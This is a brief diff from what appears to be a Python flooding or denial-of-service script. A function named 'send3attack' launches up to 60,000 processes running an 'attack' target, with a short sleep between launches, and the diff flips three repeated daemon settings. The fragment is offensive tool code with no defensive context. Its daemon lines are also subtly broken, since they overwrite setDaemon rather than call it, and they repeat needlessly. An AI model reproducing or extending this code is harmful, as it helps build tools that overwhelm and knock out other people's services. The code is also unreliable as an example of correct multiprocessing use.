@@ -88,9 +88,9 @@ bar2.finish()
 def send3attack():
   for i in range(60000): 
     mp = multiprocessing.Process(target=attack)
-    mp.setDaemon = False
-    mp.setDaemon = False
-    mp.setDaemon = False
+    mp.setDaemon = True
+    mp.setDaemon = True
+    mp.setDaemon = True
     mp.start() 
     sleep(0.6)
 	
